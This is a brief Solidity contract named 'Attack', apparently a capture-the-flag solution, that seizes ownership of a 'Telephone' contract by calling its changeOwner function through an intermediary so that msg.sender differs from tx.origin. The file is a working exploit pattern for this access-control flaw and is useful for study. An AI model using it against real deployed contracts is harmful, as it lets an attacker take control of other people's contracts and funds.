// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Telephone.sol";

contract Attack {
    Telephone public telephoneContract;

    constructor(address payable _telephoneContractAddress) {
        telephoneContract = Telephone(_telephoneContractAddress);
    }

    function attack(address _attackEoa) public payable {
        // call the attack contract and pass in the address of my EOA
        telephoneContract.changeOwner(_attackEoa);
    }

    receive() external payable {}
}
